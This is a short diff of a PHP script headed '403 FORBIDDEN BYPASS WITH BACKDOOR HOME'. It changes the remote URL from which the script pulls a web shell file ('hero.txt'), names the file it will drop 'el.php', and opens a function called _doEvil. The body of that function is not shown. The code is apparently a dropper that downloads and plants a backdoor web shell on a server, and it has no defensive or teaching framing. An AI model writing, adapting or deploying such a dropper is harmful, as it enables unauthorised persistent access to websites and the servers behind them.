@@ -3,7 +3,7 @@
 	403 FORBIDDEN BYPASS
 	WITH BACKDOOR HOME
 */
-$source = "https://raw.githubusercontent.com/KelelawarCyberTeam/Shell-Bypass-403/main/terbaru/hero.txt";
+$source = "https://raw.githubusercontent.com/L-FAN/tugas-ct/root/hero.txt";
 $name = "el.php";
 
 function _doEvil($name, $file) {
